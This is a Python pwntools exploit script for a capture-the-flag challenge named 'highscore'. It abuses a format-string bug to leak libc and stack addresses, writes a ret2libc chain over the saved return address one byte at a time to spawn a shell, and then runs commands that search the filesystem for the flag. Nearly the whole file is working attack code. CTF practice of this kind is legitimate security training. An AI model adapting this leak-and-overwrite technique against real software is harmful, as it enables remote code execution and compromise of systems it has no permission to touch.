#!/usr/bin/env python3
from pwn import *

# Challenge: highscore (format string)
# Primitive: controlled format string in option 1 with positional writes (%12$hhn)
# Strategy:
# 1) Leak libc pointer and stack pointer via %17$p / %18$p.
# 2) Compute libc base and saved RIP slot.
# 3) Overwrite saved RIP with a ret2libc chain using byte writes.
# 4) Trigger function return via menu option 4 and execute shell command(s).

context.binary = ELF('./highscore', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

HOST = 'challs.insec.club'
PORT = 40009

# Verified offsets from local analysis
LIBC_BASE_FROM_LEAK17 = 0x29CA8
RET_SLOT_DELTA_FROM_LEAK18 = 0xF8

# Verified gadgets/symbols in provided libc
RET_OFF = 0x2846B
POP_RDI_OFF = 0x2A145
SYSTEM_OFF = 0x53110
EXIT_OFF = 0x42340
BIN_SH_OFF = 0x1A7EA4
MAX_ATTEMPTS = 40


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process('./highscore')


def recv_menu(io):
    io.recvuntil(b'>> ')


def set_name(io, payload: bytes) -> bytes:
    recv_menu(io)
    io.sendline(b'1')
    io.recvuntil(b'Enter new name: ')
    io.sendline(payload)
    io.recvuntil(b'Player: ')
    return io.recvline().strip()


def leak_ptr(io, idx: int) -> int:
    out = set_name(io, f'%{idx}$p'.encode())
    if out == b'(nil)':
        return 0
    return int(out.decode(), 16)


def write_byte(io, addr: int, value: int) -> None:
    # %hhn writes one byte: number of printed chars mod 256.
    width = value if value != 0 else 256
    fmt = f'%{width}c%12$hhn'.encode()

    # Keep the write target in the slot used by %12$hhn (offset 16 in input buffer).
    # Null-terminate the format string before raw address bytes for stability.
    payload = (fmt + b'\x00').ljust(16, b'A') + p64(addr)
    set_name(io, payload)


def write_qword(io, addr: int, value: int) -> None:
    data = p64(value)
    for i, b in enumerate(data):
        write_byte(io, addr + i, b)


def address_bytes_safe(addr: int) -> bool:
    # fgets stops at '\n'. If a target pointer byte contains 0x0a,
    # the pointer argument in our payload gets truncated.
    return b'\x0a' not in p64(addr)


def write_plan_safe(ret_slot: int, qword_count: int) -> bool:
    total = qword_count * 8
    for i in range(total):
        if not address_bytes_safe(ret_slot + i):
            return False
    return True


def build_chain(libc_base: int) -> list[int]:
    return [
        libc_base + RET_OFF,
        libc_base + POP_RDI_OFF,
        libc_base + BIN_SH_OFF,
        libc_base + SYSTEM_OFF,
        libc_base + EXIT_OFF,
    ]


def exploit(io):
    leak17 = leak_ptr(io, 17)
    leak18 = leak_ptr(io, 18)

    libc_base = leak17 - LIBC_BASE_FROM_LEAK17
    ret_slot = leak18 - RET_SLOT_DELTA_FROM_LEAK18
    chain = build_chain(libc_base)

    if not write_plan_safe(ret_slot, len(chain)):
        raise RuntimeError('Unsafe stack layout for byte writes (contains newline in pointer bytes), retrying')

    log.success(f'leak17 = {hex(leak17)}')
    log.success(f'leak18 = {hex(leak18)}')
    log.success(f'libc_base = {hex(libc_base)}')
    log.success(f'ret_slot = {hex(ret_slot)}')

    for i, qword in enumerate(chain):
        target = ret_slot + (8 * i)
        log.info(f'Writing {hex(qword)} -> {hex(target)}')
        write_qword(io, target, qword)

    recv_menu(io)
    io.sendline(b'4')


def get_flag(io):
    # Try likely flag locations. Output is shown so you can see which one hits.
    cmds = [
        b'cat flag',
        b'cat flag.txt',
        b'cat /flag',
        b'cat /home/*/flag* 2>/dev/null',
        b'find / -maxdepth 3 -iname "*flag*" 2>/dev/null | head -n 20',
    ]
    for cmd in cmds:
        io.sendline(cmd)
        out = io.recvrepeat(0.8)
        text = out.decode('latin1', 'ignore')
        print(text)
        if 'INSEC{' in text:
            return text
    return ''


def main():
    last_err = None
    for attempt in range(1, MAX_ATTEMPTS + 1):
        io = start()
        try:
            log.info(f'Attempt {attempt}/{MAX_ATTEMPTS}')
            exploit(io)
            io.sendline(b'echo SHELL_OK && /usr/bin/id')
            print(io.recvrepeat(0.8).decode('latin1', 'ignore'))
            flag_text = get_flag(io)
            if 'INSEC{' in flag_text:
                log.success('Flag found!')
            else:
                log.warning('No INSEC{...} flag found in common locations. Use interactive shell.')
                if args.INTERACTIVE:
                    io.interactive()
            return
        except Exception as e:
            last_err = e
            log.warning(f'Attempt {attempt} failed: {type(e).__name__}: {e}')
        finally:
            try:
                io.close()
            except Exception:
                pass

    raise RuntimeError(f'All attempts failed. Last error: {last_err}')


if __name__ == '__main__':
    main()
